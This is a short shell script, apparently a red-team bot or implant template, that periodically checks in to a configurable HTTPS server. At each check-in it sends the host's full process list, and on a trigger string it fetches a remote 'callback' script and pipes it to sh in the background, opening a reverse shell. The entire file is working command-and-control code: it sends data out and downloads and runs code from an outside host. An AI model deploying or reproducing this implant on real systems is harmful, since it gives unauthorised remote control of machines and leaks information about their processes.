#!/bin/sh
#
# bot.sh
# Bot script
# By J. Stuart McMurray
# Created 20240807
# Last Modified 20240807

set -e

: "${ADDRESS:="127.0.0.1:4444"}"          # Server IP address and port
: "${INTERVAL:=120}"                      # Time in seconds between checkins
: "${CURL_MAX:=60}"                       # Curl timeout in seconds
: "${BOT_ID:="$(hostname || uname -n)"}"  # Bot ID
: "${CB_SCRIPT:="callback.sh"}"           # Callback script on the server
: "${END_DATE:=$(($(date +%s) + 86400))}" # One day from the start

# req performs a an HTTP request to the server/$1.
# The rest of the arguments are added to the curl command line.
req() {(
        P="$1"
        shift
        curl --silent --insecure --fail \
                --max-time "$CURL_MAX" \
                --pinnedpubkey sha256//m4_fingerprint \
                --data-binary @- \
                "https://$ADDRESS/$P" \
                "$@"
)}

# callback calls back with curlrevshell.
callback() {(
        req "${CB_SCRIPT}" | sh >/dev/null 2>&1 &
)}

# checkin checks in to the server and spawns a shell if needed
checkin() {(
        # Check in to the server
        GOT=$(
                (ps awwwfux || ps auxwww ) |
                req "checkin/$BOT_ID" --data-binary @-
        )
        RET=$?

        # If we're meant to call back, do it in the background
        if [ m4_callbackstring = "$GOT" ]; then
                callback &
        fi

        # We return curl's return code
        return $RET
)}

# Make sure we can call back at least once
if ! checkin; then
        echo "Initial checkin failed" >&2
        exit 1
fi

# running_too_long returns true if we're past the END_DATE.
running_too_long() {
        return $(($(date +%s) < $END_DATE)) # Because bash is backwards
}

# Check in every so often
while ! running_too_long ; do
        checkin
        sleep "$INTERVAL"
done

# vim: ft=sh
